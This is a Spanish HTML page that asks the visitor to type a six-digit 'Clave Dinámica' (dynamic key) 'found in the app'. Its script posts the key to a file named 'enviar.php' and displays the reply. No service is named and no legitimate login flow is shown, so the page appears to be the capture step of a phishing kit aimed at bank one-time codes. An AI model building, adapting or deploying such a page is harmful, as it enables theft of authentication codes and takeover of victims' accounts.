<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Clave Dinámica</title>

  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #1f1f1f;
      color: white;
      background-image: url('trazo.svg');
      background-size: cover;   /* 🔑 se adapta a toda la pantalla */
      background-position: center;
      background-repeat: no-repeat;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 15px; /* algo de aire en móviles */
    }

    .modal {
        background-color: #333;  /* 🔒 Fondo sólido gris oscuro */
        padding: clamp(20px, 4vw, 40px);
        border-radius: 15px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
        width: 90%;
        max-width: 420px;
    }

    .modal h2 {
      text-align: center;
      margin-bottom: 10px;
      font-size: clamp(1.2rem, 2.5vw, 1.6rem);
    }

    .modal p {
      text-align: center;
      color: #bbb;
      margin-bottom: 20px;
      font-size: clamp(0.85rem, 2vw, 1rem);
    }

    .gif-container {
      text-align: center;
      margin-bottom: 15px;
    }

    .gif-container img {
      max-width: 100%;
      height: auto;
      border-radius: 10px;
    }

    .input-group {
      display: flex;
      justify-content: center;
      gap: clamp(6px, 2vw, 12px); /* espaciado dinámico */
      margin-bottom: 25px;
      flex-wrap: wrap; /* si no cabe en una fila, baja */
    }

    .input-group input {
      width: clamp(35px, 12vw, 55px);
      height: clamp(45px, 14vw, 65px);
      background: transparent;
      border: none;
      border-bottom: 2px solid #ccc;
      color: white;
      text-align: center;
      font-size: clamp(1.2rem, 5vw, 2rem);
      border-radius: 5px;
    }

    .input-group input:focus {
      border-bottom: 2px solid #ffcc00;
      outline: none;
    }

    .buttons {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      flex-wrap: wrap;
    }

    .btn {
      flex: 1;
      background-color: #333;
      color: white;
      border: 1px solid #555;
      padding: clamp(10px, 2.5vw, 14px);
      border-radius: 25px;
      cursor: pointer;
      font-size: clamp(0.9rem, 2.5vw, 1rem);
      transition: background 0.2s;
      text-align: center;
    }

    .btn:hover {
      background-color: #444;
    }

    .btn:active {
      background-color: #555;
    }
  </style>
</head>
<body>

  <div class="modal">
    <div class="gif-container">
      <img src="funcion.gif" alt="Funcion GIF">
    </div>
    
    <h2>Ingresa la Clave Dinámica</h2>
    <p>Encuentra tu Clave Dinámica en la app</p>

    <form id="claveForm">
      <div class="input-group">
        <input type="password" maxlength="1" />
        <input type="password" maxlength="1" />
        <input type="password" maxlength="1" />
        <input type="password" maxlength="1" />
        <input type="password" maxlength="1" />
        <input type="password" maxlength="1" />
      </div>

      <div class="buttons">
        <button type="button" class="btn" id="borrarBtn">Borrar</button>
        <button type="submit" class="btn">Continuar</button>
      </div>
    </form>
  </div>

  <script>
    const inputs = document.querySelectorAll('.input-group input');
    const form = document.getElementById('claveForm');

    // Navegación entre inputs
    inputs.forEach((input, index) => {
      input.addEventListener('input', function () {
        if (this.value && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', function (e) {
        if (e.key === 'Backspace' && !this.value && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });

    document.getElementById('borrarBtn').addEventListener('click', () => {
      inputs.forEach(input => input.value = '');
      inputs[0].focus();
    });

    // Al enviar formulario
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const clave = Array.from(inputs).map(i => i.value).join('');

      // Enviar al PHP vía fetch
      const resp = await fetch("enviar.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "clave=" + encodeURIComponent(clave)
      });

      const data = await resp.text();
      alert(data);
    });
  </script>
  
</body>
</html>
